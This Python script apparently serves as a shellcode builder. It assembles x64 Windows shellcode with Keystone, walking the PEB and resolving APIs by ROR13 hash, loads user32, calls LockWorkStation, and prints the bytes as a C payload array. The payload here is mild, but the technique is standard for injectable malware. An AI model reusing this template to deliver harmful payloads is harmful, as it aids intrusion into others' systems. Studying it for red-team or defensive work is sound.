import ctypes, struct
from keystone import *
CODE = (
"find_kernel32:"
" xor rdx, rdx;"
" mov rax, gs:[rdx+0x60];"    
" mov rsi,[rax+0x18];"        
" mov rsi,[rsi + 0x20];"      
" mov r9, [rsi];"            
" mov r9, [r9];"             
" mov r9, [r9+0x20];"         
" jmp call_lockworkstation;"  

"parse_module:"               
" mov ecx, dword ptr [r9 + 0x3c];" 
" xor r15, r15;"
" mov r15b, 0x88;"            
" add r15, r9;"
" add r15, rcx;"
" mov r15d, dword ptr [r15];" 
" add r15, r9;"               
" mov ecx, dword ptr [r15 + 0x18];" 
" mov r14d, dword ptr [r15 + 0x20];" 
" add r14, r9;"               

"search_function:"            
" jrcxz not_found;"           
" dec ecx;"
" xor rsi, rsi;"
" mov esi, [r14 + rcx*4];"    
" add rsi, r9;"               

"function_hashing:"           
" xor rax, rax;"
" xor rdx, rdx;"
" cld;"

"iteration:"                  
" lodsb;"
" test al, al;"
" jz compare_hash;"           
" ror edx, 0x0d;"             
" add edx, eax;"              
" jmp iteration;"

"compare_hash:"              
" cmp edx, r8d;"
" jnz search_function;"       
" mov r10d, [r15 + 0x24];"    
" add r10, r9;"               
" movzx ecx, word ptr [r10 + 2*rcx];" 
" mov r11d, [r15 + 0x1c];"    
" add r11, r9;"               
" mov eax, [r11 + 4*rcx];"    
" add rax, r9;"               
" ret;"

"not_found:"
" ret;"

"call_lockworkstation:"
"  mov r8d, 0xec0e4e8e;"      
"  call parse_module;"        
"  xor rcx, rcx;"
"  push rcx;"                 
"  mov rcx, 0x323372657375;"  
"  push rcx;"
"  lea rcx, [rsp];"           
"  sub rsp, 0x28;"            
"  call rax;"                
"  add rsp, 0x38;"            
"  mov r9, rax;"              
"  mov r8d, 0x5724E68F;"      
"  call parse_module;"        
"  sub rsp, 0x28;"            
"  call rax;"                 
"  add rsp, 0x28;"            
"  ret;"                      
)
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
print("%d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)
sc = ""
print("Payload size: "+str(len(encoding))+" bytes")


counter = 0
sc = "unsigned char my_payload[] = {\n    "

for dec in encoding:
    if counter % 15 == 0 and counter != 0:
        sc += ",\n    "
    elif counter != 0:
        sc += ", "
        
    sc += "0x{0:02x}".format(int(dec))
    counter += 1

sc += "\n};\n"
sc += "unsigned int my_payload_len = sizeof(my_payload);"

print(sc)

print("Payload size: "+str(len(encoding))+" bytes")
